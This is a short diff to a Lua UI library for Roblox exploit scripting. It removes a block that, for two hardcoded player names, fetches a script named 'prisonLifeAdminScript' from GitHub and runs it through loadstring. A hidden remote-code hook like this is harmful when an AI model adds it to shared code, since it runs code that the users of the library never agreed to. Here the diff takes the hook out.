@@ -2861,20 +2861,6 @@ function RayfieldLibrary:LoadConfiguration()
 	end
 end
 
-local allowedNames = {
-	["L0CKED_1N1"] = true,
-	["CHEATING_B0SS"] = true
-}
-
-if getgenv().passed_loaded_jobid_joiner and allowedNames[game.Players.LocalPlayer.Name] then
-	warn("Already loaded owner JOB-ID Joiner.")
-elseif getgenv().passed_loaded_jobid_joiner == false and allowedNames[game.Players.LocalPlayer.Name] then
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/prisonLifeAdminScript/refs/heads/main/file.js'))()
-	getgenv().css_digital = true
-else
-	warn("Action denied.")
-end
-
 if useStudio then
 	local Window = RayfieldLibrary:CreateWindow({
 		Name = "The system could not find the file specified.",
